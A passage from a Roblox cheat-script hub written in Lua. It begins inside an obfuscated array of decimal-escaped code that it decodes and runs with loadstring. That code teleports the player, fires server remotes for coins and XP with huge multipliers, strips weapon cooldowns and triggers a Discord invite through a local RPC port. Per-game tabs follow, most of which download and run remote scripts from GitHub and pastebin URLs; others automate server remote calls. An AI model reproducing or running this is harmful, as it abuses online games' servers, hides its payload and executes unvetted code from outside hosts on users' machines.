01","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\51","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\67","\104","\97","\114","\97","\99","\116","\101","\114","\115","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\52","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\68","\101","\118","\105","\99","\101","\115","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\53","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\9","\105","\102","\32","\112","\105","\99","\107","\32","\61","\61","\32","\34","\82","\117","\98","\105","\107","\115","\32","\67","\117","\98","\101","\34","\32","\116","\104","\101","\110","\10","\9","\9","\103","\97","\109","\101","\46","\80","\108","\97","\121","\101","\114","\115","\46","\76","\111","\99","\97","\108","\80","\108","\97","\121","\101","\114","\46","\67","\104","\97","\114","\97","\99","\116","\101","\114","\46","\72","\117","\109","\97","\110","\111","\105","\100","\82","\111","\111","\116","\80","\97","\114","\116","\46","\67","\70","\114","\97","\109","\101","\32","\61","\32","\67","\70","\114","\97","\109","\101","\46","\110","\101","\119","\40","\119","\111","\114","\107","\115","\112","\97","\99","\101","\46","\65","\114","\101","\97","\115","\46","\65","\114","\101","\97","\49","\54","\46","\83","\112","\97","\119","\110","\115","\46","\83","\112","\97","\119","\110","\49","\46","\80","\111","\115","\105","\116","\105","\111","\110","\41","\10","\9","\101","\110","\100","\10","\101","\110","\100","\41","\10","\10","\45","\45","\77","\79","\68","\32","\84","\65","\66","\32","\66","\69","\71","\73","\78","\83","\10","\77","\111","\100","\83","\101","\108","\108","\58","\78","\101","\119","\84","\111","\103","\103","\108","\101","\40","\34","\65","\117","\116","\111","\83","\101","\108","\108","\34","\44","\32","\34","\75","\105","\108","\108","\115","\32","\108","\97","\114","\118","\97","\101","\115","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\116","\111","\103","\41","\10","\9","\105","\102","\32","\116","\111","\103","\32","\61","\61","\32","\116","\114","\117","\101","\32","\116","\104","\101","\110","\10","\9","\9","\95","\71","\46","\65","\117","\116","\111","\83","\101","\108","\108","\32","\61","\32","\116","\114","\117","\101","\10","\10","\9","\9","\119","\104","\105","\108","\101","\32","\95","\71","\46","\65","\117","\116","\111","\83","\101","\108","\108","\32","\61","\61","\32","\116","\114","\117","\101","\32","\100","\111","\32","\119","\97","\105","\116","\40","\46","\49","\41","\10","\9","\9","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\39","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\39","\46","\82","\101","\109","\111","\116","\101","\115","\46","\115","\101","\108","\108","\66","\114","\105","\99","\107","\115","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\41","\10","\9","\9","\101","\110","\100","\10","\9","\101","\108","\115","\101","\10","\9","\9","\95","\71","\46","\65","\117","\116","\111","\83","\101","\108","\108","\32","\61","\32","\102","\97","\108","\115","\101","\10","\10","\9","\101","\110","\100","\10","\101","\110","\100","\41","\10","\10","\10","\77","\111","\100","\87","\101","\97","\112","\111","\110","\58","\78","\101","\119","\66","\117","\116","\116","\111","\110","\40","\34","\78","\111","\32","\67","\111","\111","\108","\100","\111","\119","\110","\34","\44","\32","\34","\82","\101","\109","\111","\118","\101","\115","\32","\119","\97","\105","\116","\32","\116","\105","\109","\101","\32","\102","\111","\114","\32","\119","\101","\97","\112","\111","\110","\115","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\102","\111","\114","\32","\105","\44","\118","\32","\105","\110","\32","\110","\101","\120","\116","\44","\103","\101","\116","\103","\99","\40","\116","\114","\117","\101","\41","\100","\111","\10","\9","\9","\105","\102","\32","\116","\121","\112","\101","\40","\118","\41","\61","\61","\39","\116","\97","\98","\108","\101","\39","\97","\110","\100","\32","\114","\97","\119","\103","\101","\116","\40","\118","\44","\39","\67","\111","\111","\108","\100","\111","\119","\110","\39","\41","\116","\104","\101","\110","\10","\9","\9","\9","\118","\46","\67","\111","\111","\108","\100","\111","\119","\110","\32","\61","\32","\48","\10","\9","\9","\101","\110","\100","\10","\9","\101","\110","\100","\10","\101","\110","\100","\41","\10","\10","\77","\111","\100","\87","\101","\97","\112","\111","\110","\58","\78","\101","\119","\84","\101","\120","\116","\66","\111","\120","\40","\34","\82","\111","\99","\107","\101","\116","\32","\83","\112","\101","\101","\100","\34","\44","\32","\34","\72","\111","\119","\32","\102","\97","\115","\116","\32","\114","\111","\99","\107","\101","\116","\115","\32","\116","\114","\97","\118","\101","\108","\32","\119","\104","\101","\110","\32","\121","\111","\117","\32","\108","\97","\117","\110","\99","\104","\32","\116","\104","\101","\109","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\116","\120","\116","\41","\10","\9","\102","\111","\114","\32","\95","\44","\111","\98","\106","\32","\105","\110","\32","\112","\97","\105","\114","\115","\40","\100","\101","\98","\117","\103","\46","\103","\101","\116","\114","\101","\103","\105","\115","\116","\114","\121","\40","\41","\41","\32","\100","\111","\10","\9","\9","\105","\102","\32","\116","\121","\112","\101","\40","\111","\98","\106","\41","\32","\61","\61","\32","\34","\116","\97","\98","\108","\101","\34","\32","\116","\104","\101","\110","\10","\9","\9","\9","\105","\102","\32","\111","\98","\106","\46","\82","\111","\99","\107","\101","\116","\83","\112","\101","\101","\100","\32","\116","\104","\101","\110","\10","\9","\9","\9","\9","\111","\98","\106","\46","\82","\111","\99","\107","\101","\116","\83","\112","\101","\101","\100","\32","\61","\32","\116","\120","\116","\10","\9","\9","\9","\101","\110","\100","\10","\9","\9","\101","\110","\100","\10","\9","\101","\110","\100","\10","\101","\110","\100","\41","\10","\10","\77","\111","\100","\66","\111","\111","\115","\116","\58","\78","\101","\119","\84","\101","\120","\116","\66","\111","\120","\40","\34","\67","\111","\105","\110","\32","\77","\117","\108","\116","\105","\112","\108","\105","\101","\114","\34","\44","\32","\34","\88","\32","\109","\111","\114","\101","\32","\97","\109","\111","\117","\110","\116","\32","\111","\102","\32","\99","\111","\105","\110","\115","\32","\121","\111","\117","\32","\103","\101","\116","\32","\102","\111","\114","\32","\115","\101","\108","\108","\105","\110","\103","\32","\98","\114","\105","\99","\107","\115","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\116","\120","\116","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\67","\111","\105","\110","\66","\111","\111","\115","\116","\34","\44","\57","\57","\57","\57","\57","\57","\57","\57","\57","\44","\116","\120","\116","\41","\10","\101","\110","\100","\41","\10","\10","\77","\111","\100","\66","\111","\111","\115","\116","\58","\78","\101","\119","\84","\101","\120","\116","\66","\111","\120","\40","\34","\88","\80","\32","\77","\117","\108","\116","\105","\112","\108","\105","\101","\114","\34","\44","\32","\34","\88","\32","\109","\111","\114","\101","\32","\97","\109","\111","\117","\110","\116","\32","\111","\102","\32","\88","\80","\32","\121","\111","\117","\32","\103","\101","\116","\32","\102","\111","\114","\32","\100","\101","\115","\116","\114","\111","\121","\105","\110","\103","\32","\98","\114","\105","\99","\107","\115","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\116","\120","\116","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\88","\80","\66","\111","\111","\115","\116","\34","\44","\57","\57","\57","\57","\57","\57","\57","\57","\57","\44","\116","\120","\116","\41","\10","\101","\110","\100","\41","\10","\10","\77","\111","\100","\66","\111","\111","\115","\116","\58","\78","\101","\119","\84","\101","\120","\116","\66","\111","\120","\40","\34","\66","\114","\105","\99","\107","\32","\77","\117","\108","\116","\105","\112","\108","\105","\101","\114","\34","\44","\32","\34","\88","\32","\109","\111","\114","\101","\32","\97","\109","\111","\117","\110","\116","\32","\111","\102","\32","\98","\114","\105","\99","\107","\115","\32","\121","\111","\117","\32","\103","\101","\116","\34","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\116","\120","\116","\41","\10","\9","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\82","\101","\112","\108","\105","\99","\97","\116","\101","\100","\83","\116","\111","\114","\97","\103","\101","\34","\41","\46","\82","\101","\109","\111","\116","\101","\115","\46","\103","\101","\110","\101","\114","\97","\116","\101","\66","\111","\111","\115","\116","\58","\70","\105","\114","\101","\83","\101","\114","\118","\101","\114","\40","\34","\66","\114","\105","\99","\107","\66","\111","\111","\115","\116","\34","\44","\57","\57","\57","\57","\57","\57","\57","\57","\57","\44","\116","\120","\116","\41","\10","\101","\110","\100","\41","\10","\10","\45","\45","\83","\69","\84","\84","\73","\78","\71","\32","\84","\65","\66","\32","\66","\69","\71","\73","\78","\83","\10","\83","\101","\116","\116","\105","\110","\103","\58","\78","\101","\119","\75","\101","\121","\98","\105","\110","\100","\40","\34","\75","\101","\121","\98","\105","\110","\100","\34","\44","\32","\34","\84","\111","\103","\103","\108","\101","\32","\71","\85","\73","\32","\119","\105","\116","\104","\32","\116","\104","\105","\115","\34","\44","\32","\69","\110","\117","\109","\46","\75","\101","\121","\67","\111","\100","\101","\46","\76","\101","\102","\116","\65","\108","\116","\44","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\76","\105","\98","\114","\97","\114","\121","\58","\84","\111","\103","\103","\108","\101","\85","\73","\40","\41","\10","\101","\110","\100","\41","\10","\10","\45","\45","\68","\73","\83","\67","\79","\82","\68","\32","\73","\78","\86","\73","\84","\69","\10","\108","\111","\99","\97","\108","\32","\83","\101","\116","\116","\105","\110","\103","\115","\32","\61","\32","\123","\10","\9","\73","\110","\118","\105","\116","\101","\67","\111","\100","\101","\32","\61","\32","\34","\117","\99","\120","\103","\121","\57","\114","\55","\99","\107","\34","\10","\125","\10","\10","\45","\45","\32","\79","\98","\106","\101","\99","\116","\115","\10","\108","\111","\99","\97","\108","\32","\72","\116","\116","\112","\83","\101","\114","\118","\105","\99","\101","\32","\61","\32","\103","\97","\109","\101","\58","\71","\101","\116","\83","\101","\114","\118","\105","\99","\101","\40","\34","\72","\116","\116","\112","\83","\101","\114","\118","\105","\99","\101","\34","\41","\10","\108","\111","\99","\97","\108","\32","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\10","\10","\105","\102","\32","\115","\121","\110","\32","\97","\110","\100","\32","\115","\121","\110","\46","\114","\101","\113","\117","\101","\115","\116","\32","\116","\104","\101","\110","\10","\9","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\32","\61","\32","\115","\121","\110","\46","\114","\101","\113","\117","\101","\115","\116","\10","\101","\108","\115","\101","\105","\102","\32","\114","\101","\113","\117","\101","\115","\116","\32","\116","\104","\101","\110","\10","\9","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\32","\61","\32","\114","\101","\113","\117","\101","\115","\116","\10","\101","\108","\115","\101","\105","\102","\32","\104","\116","\116","\112","\32","\97","\110","\100","\32","\104","\116","\116","\112","\46","\114","\101","\113","\117","\101","\115","\116","\32","\116","\104","\101","\110","\10","\9","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\32","\61","\32","\104","\116","\116","\112","\46","\114","\101","\113","\117","\101","\115","\116","\10","\101","\108","\115","\101","\105","\102","\32","\104","\116","\116","\112","\95","\114","\101","\113","\117","\101","\115","\116","\32","\116","\104","\101","\110","\10","\9","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\32","\61","\32","\104","\116","\116","\112","\95","\114","\101","\113","\117","\101","\115","\116","\10","\101","\110","\100","\10","\10","\108","\111","\99","\97","\108","\32","\68","\105","\115","\99","\111","\114","\100","\65","\112","\105","\85","\114","\108","\32","\61","\32","\34","\104","\116","\116","\112","\58","\47","\47","\49","\50","\55","\46","\48","\46","\48","\46","\49","\58","\37","\115","\47","\114","\112","\99","\63","\118","\61","\49","\34","\10","\10","\45","\45","\32","\83","\116","\97","\114","\116","\10","\105","\102","\32","\110","\111","\116","\32","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\32","\116","\104","\101","\110","\10","\9","\114","\101","\116","\117","\114","\110","\32","\112","\114","\105","\110","\116","\40","\34","\89","\111","\117","\114","\32","\101","\120","\101","\99","\117","\116","\111","\114","\32","\100","\111","\101","\115","\32","\110","\111","\116","\32","\115","\117","\112","\112","\111","\114","\116","\32","\104","\116","\116","\112","\32","\114","\101","\113","\117","\101","\115","\116","\115","\46","\34","\41","\10","\101","\110","\100","\10","\10","\102","\111","\114","\32","\105","\32","\61","\32","\54","\52","\53","\51","\44","\32","\54","\52","\54","\52","\32","\100","\111","\10","\9","\108","\111","\99","\97","\108","\32","\68","\105","\115","\99","\111","\114","\100","\73","\110","\118","\105","\116","\101","\82","\101","\113","\117","\101","\115","\116","\32","\61","\32","\102","\117","\110","\99","\116","\105","\111","\110","\40","\41","\10","\9","\9","\108","\111","\99","\97","\108","\32","\82","\101","\113","\117","\101","\115","\116","\32","\61","\32","\82","\101","\113","\117","\101","\115","\116","\70","\117","\110","\99","\116","\105","\111","\110","\40","\123","\10","\9","\9","\9","\85","\114","\108","\32","\61","\32","\115","\116","\114","\105","\110","\103","\46","\102","\111","\114","\109","\97","\116","\40","\68","\105","\115","\99","\111","\114","\100","\65","\112","\105","\85","\114","\108","\44","\32","\116","\111","\115","\116","\114","\105","\110","\103","\40","\105","\41","\41","\44","\10","\9","\9","\9","\77","\101","\116","\104","\111","\100","\32","\61","\32","\34","\80","\79","\83","\84","\34","\44","\10","\9","\9","\9","\66","\111","\100","\121","\32","\61","\32","\72","\116","\116","\112","\83","\101","\114","\118","\105","\99","\101","\58","\74","\83","\79","\78","\69","\110","\99","\111","\100","\101","\40","\123","\10","\9","\9","\9","\9","\110","\111","\110","\99","\101","\32","\61","\32","\72","\116","\116","\112","\83","\101","\114","\118","\105","\99","\101","\58","\71","\101","\110","\101","\114","\97","\116","\101","\71","\85","\73","\68","\40","\102","\97","\108","\115","\101","\41","\44","\10","\9","\9","\9","\9","\97","\114","\103","\115","\32","\61","\32","\123","\10","\9","\9","\9","\9","\9","\105","\110","\118","\105","\116","\101","\32","\61","\32","\123","\99","\111","\100","\101","\32","\61","\32","\83","\101","\116","\116","\105","\110","\103","\115","\46","\73","\110","\118","\105","\116","\101","\67","\111","\100","\101","\125","\44","\10","\9","\9","\9","\9","\9","\99","\111","\100","\101","\32","\61","\32","\83","\101","\116","\116","\105","\110","\103","\115","\46","\73","\110","\118","\105","\116","\101","\67","\111","\100","\101","\10","\9","\9","\9","\9","\125","\44","\10","\9","\9","\9","\9","\99","\109","\100","\32","\61","\32","\34","\73","\78","\86","\73","\84","\69","\95","\66","\82","\79","\87","\83","\69","\82","\34","\10","\9","\9","\9","\125","\41","\44","\10","\9","\9","\9","\72","\101","\97","\100","\101","\114","\115","\32","\61","\32","\123","\10","\9","\9","\9","\9","\91","\34","\79","\114","\105","\103","\105","\110","\34","\93","\32","\61","\32","\34","\104","\116","\116","\112","\115","\58","\47","\47","\100","\105","\115","\99","\111","\114","\100","\46","\99","\111","\109","\34","\44","\10","\9","\9","\9","\9","\91","\34","\67","\111","\110","\116","\101","\110","\116","\45","\84","\121","\112","\101","\34","\93","\32","\61","\32","\34","\97","\112","\112","\108","\105","\99","\97","\116","\105","\111","\110","\47","\106","\115","\111","\110","\34","\10","\9","\9","\9","\125","\10","\9","\9","\125","\41","\10","\9","\101","\110","\100","\10","\9","\115","\112","\97","\119","\110","\40","\68","\105","\115","\99","\111","\114","\100","\73","\110","\118","\105","\116","\101","\82","\101","\113","\117","\101","\115","\116","\41","\10","\101","\110","\100",}ygCBARfyzhiIiiiIiIi="";for _,alpLoTjBAzWWWWwWWww in pairs(GrzRXsjpdQZZZZZzzzZ)do ygCBARfyzhiIiiiIiIi=ygCBARfyzhiIiiiIiIi..alpLoTjBAzWWWWwWWww;end;cTMmWNPMbxZzzZZzzzZ=function(bYGPYQuVVPhHHHhHHhh)loadstring(bYGPYQuVVPhHHHhHHhh)()end;cTMmWNPMbxZzzZZzzzZ(ygCBARfyzhiIiiiIiIi)
       end, 
    })
 
 
 
 
 
 
 
 
 else
     game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Game Not Supported", Text = "Check Misc Tab For List", Icon = "rbxassetid://2817046761", Duration = 10, Button1 = "Yes", Button2 = "No" })
 end

 -- My little pony tycoon
elseif game.GameId==6476128956 then
    local gameTab = Window:CreateTab("My Little Pony Tycoon", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("My Little Pony Tycoon")
   
    local Button = gameTab:CreateButton({
       Name = "My Little Pony Tycoon",
       Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/itsnoctural/Utilities/refs/heads/main/MyLittlePonyTycoon.lua"))()
       end, 
    })

    -- Randomizer
elseif game.GameId==1858442722 then
    local gameTab = Window:CreateTab("Randomizer", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Randomizer")
   
    local Button = gameTab:CreateButton({
       Name = "Randomizer GUI",
       Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/Randomizer.lua'))()
       end, 
    })

     -- Total Roblox Drama
elseif game.GameId==1668992109 then
    local gameTab = Window:CreateTab("Total Roblox Drama", 4483362458) -- Title, Image
    local Section = gameTab:CreateSection("Total Roblox Drama")
   
    local Button = gameTab:CreateButton({
       Name = "Total Roblox Drama GUI",
       Callback = function()
        local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
local window = DrRayLibrary:Load("DrRay", "Default")
 
local tab = DrRayLibrary.newTab("Bypasser Exe - Total Roblox Drama", "ImageIdHere")
 
tab.newButton("R3TH Priv", "Executes R3TH Priv", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
end)
 
tab.newButton("Vyra Camp Script", "Executes Vyra Camp Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kureu/Roblox-T.R.D-Camp-Script/main/Roblox%20T.R.D%20Camp%20Script"))();
end)
 
tab.newButton("Vyra Movie Script", "Executes Vyra Camp Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kureu/Roblox-T.R.D-Movies-Script/main/Protected_2790861193015493.lua"))();
end)
 
tab.newButton("Hitbox", "Executes Hitbox Script", function()
loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Update-script-hitbox-9326"))()
end)
 
 
tab.newSlider("Speed", "Customize Your Speed", 1000, false, function(num)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = num
print(num)
end)
 
tab.newSlider("Jump Power", "Customize Your Jump Power", 1000, false, function(num)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = num
print(num)
end)
       end, 
    })

    -- Survive Area 51
elseif game.GameId==73754455 then 
   local gameTab = Window:CreateTab("Survive Area 51", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Survive Area 51")
  
   local Button = gameTab:CreateButton({
      Name = "Survive Area 51 GUI",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Saktk-In-Area51/main/Area51", true))()
      end, 
   })

   local Button = gameTab:CreateButton({
      Name = "VoyagerX Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/JayH4x/NexxorsScripts/main/VoyagerX.lua"))()
      end, 
   })

   -- Obby But You're On A Bike
elseif game.GameId==4908792642 then 
   local gameTab = Window:CreateTab("Obby But You're On A Bike", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Obby But You're On A Bike")
  
   local Button = gameTab:CreateButton({
      Name = "Auto finish",
      Callback = function()
         loadstring(game:HttpGet(('https://raw.githubusercontent.com/Xiam0i/Zub-Hub/main/Obby%20but%20your%20on%20a%20bike%20v2')))()
      end, 
   })

   -- Pls Donate
elseif game.GameId==3317679266 then 
   local gameTab = Window:CreateTab("Pls Donate", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("I'll Update This Crap Script Soon!")
  
   local Button = gameTab:CreateButton({
      Name = "Pretty Trash Pls Donate Script",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/fueysx/PlsDonate/main/PanelMain"))() 
      end, 
   })

    -- Get Huge Simulator
elseif game.GameId==1347180440 then 
   local gameTab = Window:CreateTab("Get Huge Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Get Huge Simulator OP!")
  
   local Button = gameTab:CreateButton({
      Name = "Keybrew Hub",
      Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/borntodiekuv/KeybrewHub/main/Main"))()
      end, 
   })

   -- Broken Bones IV
elseif game.GameId==911750776 then 
   local gameTab = Window:CreateTab("Broken Bones IV", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Broken Bones IV OP!")
  
   local Button = gameTab:CreateButton({
      Name = "Break All Bones In One Second",
      Callback = function()
         loadstring(game:HttpGet('https://pastebin.com/raw/5rEAVmcC'))()
      end, 
   })

     -- No Limit Lifting Simulator
elseif game.GameId==1673768711 then 
   local gameTab = Window:CreateTab("No Limit Lifting Simulator", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("No Limit Lifting Simulator")
  
   local Button = gameTab:CreateButton({
      Name = "No Limit Lifting Simulator GUI",
      Callback = function()
         local a=loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()local b=a:NewWindow("Lifting")local c=b:NewSection("Main")c:CreateToggle("Auto Strength",function(d)if d then _G.autostrength=true while _G.autostrength do local e={{"GainMuscle"}}game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(e))wait(1)end else _G.autostrength=false end end)c:CreateToggle("Auto Sell",function(d)if d then _G.autosell=true while _G.autosell do local e={{"SellMuscle"}}game:GetService("ReplicatedStorage"):WaitForChild("RemoteEvent"):FireServer(unpack(e))wait(1)end else _G.autosell=false end end)
      end, 
   })

   -- Lucky Block Battlegrounds
elseif game.GameId==279565647 then 
   local gameTab = Window:CreateTab("Lucky Block Battlegrounds", 4483362458) -- Title, Image
   local Section = gameTab:CreateSection("Lucky Block Battlegrounds")
  
   local Button = gameTab:CreateButton({
      Name = "Lucky Block HUB",
      Callback = function()
        --Best LuckyBlock script Join for more! https://discord.gg/v7PDxkhqWt
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "LUCKY BLOCKS Battlegrounds";
    Text = "Made by MaGiXx"; -- what the text says (ofc)
    Duration = 5;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Anti-Afk";
    Text = "Enabled!"; -- what the text says (ofc)
    Duration = 5;
})
 
local LuckyBlock = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local title = Instance.new("TextLabel")
local Frame_HUB = Instance.new("ImageLabel")
local HUB = Instance.new("TextLabel")
local Main = Instance.new("Frame")
local LuckyBlock_2 = Instance.new("TextButton")
local SuperBlock = Instance.new("TextButton")
local GalaxyBlock = Instance.new("TextButton")
local RainbowBlock = Instance.new("TextButton")
local DiamondBlock = Instance.new("TextButton")
local CopyDiscordServer = Instance.new("TextButton")
local DiscordServer_box = Instance.new("TextBox")
local lable_discord = Instance.new("TextLabel")
local open_box = Instance.new("TextBox")
local toBox = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local close = Instance.new("ImageButton")
 
--Properties:
 
LuckyBlock.Name = "LuckyBlock"
LuckyBlock.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
LuckyBlock.ResetOnSpawn = false
 
Frame.Name = "Frame"
Frame.Parent = LuckyBlock
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.304542094, 0, 0.326781332, 0)
Frame.Size = UDim2.new(0, 525, 0, 300)
Frame.Image = "rbxassetid://3570695787"
Frame.ImageColor3 = Color3.fromRGB(0, 0, 0)
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120
Frame.Active = true
Frame.Draggable = true
 
title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Size = UDim2.new(0, 439, 0, 51)
title.Font = Enum.Font.SourceSans
title.Text = "LuckyBlock"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 28.000
 
Frame_HUB.Name = "Frame_HUB"
Frame_HUB.Parent = Frame
Frame_HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.BackgroundTransparency = 1.000
Frame_HUB.BorderColor3 = Color3.fromRGB(255, 255, 255)
Frame_HUB.Position = UDim2.new(0.531428576, 0, 0.0277550742, 0)
Frame_HUB.Size = UDim2.new(0, 81, 0, 33)
Frame_HUB.Image = "rbxassetid://3570695787"
Frame_HUB.ImageColor3 = Color3.fromRGB(255, 170, 0)
Frame_HUB.ScaleType = Enum.ScaleType.Slice
Frame_HUB.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_HUB.SliceScale = 0.120
 
HUB.Name = "HUB"
HUB.Parent = Frame_HUB
HUB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HUB.BackgroundTransparency = 1.000
HUB.Position = UDim2.new(0, 0, -0.00494801067, 0)
HUB.Size = UDim2.new(0, 81, 0, 33)
HUB.Font = Enum.Font.SourceSans
HUB.Text = "HUB"
HUB.TextColor3 = Color3.fromRGB(0, 0, 0)
HUB.TextScaled = true
HUB.TextSize = 14.000
HUB.TextWrapped = true
 
Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(-0.034285713, 0, 0.170000002, 0)
Main.Size = UDim2.new(0, 559, 0, 0)
 
LuckyBlock_2.Name = "LuckyBlock"
LuckyBlock_2.Parent = Frame
LuckyBlock_2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
LuckyBlock_2.BorderSizePixel = 0
LuckyBlock_2.Position = UDim2.new(0.0552380905, 0, 0.223333329, 0)
LuckyBlock_2.Selectable = false
LuckyBlock_2.Size = UDim2.new(0, 150, 0, 35)
LuckyBlock_2.AutoButtonColor = false
LuckyBlock_2.Font = Enum.Font.SourceSans
LuckyBlock_2.Text = "LuckyBlock"
LuckyBlock_2.TextColor3 = Color3.fromRGB(255, 255, 255)
LuckyBlock_2.TextSize = 28.000
 
SuperBlock.Name = "SuperBlock"
SuperBlock.Parent = Frame
SuperBlock.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
SuperBlock.BorderSizePixel = 0
SuperBlock.Position = UDim2.new(0.0552381277, 0, 0.383333325, 0)
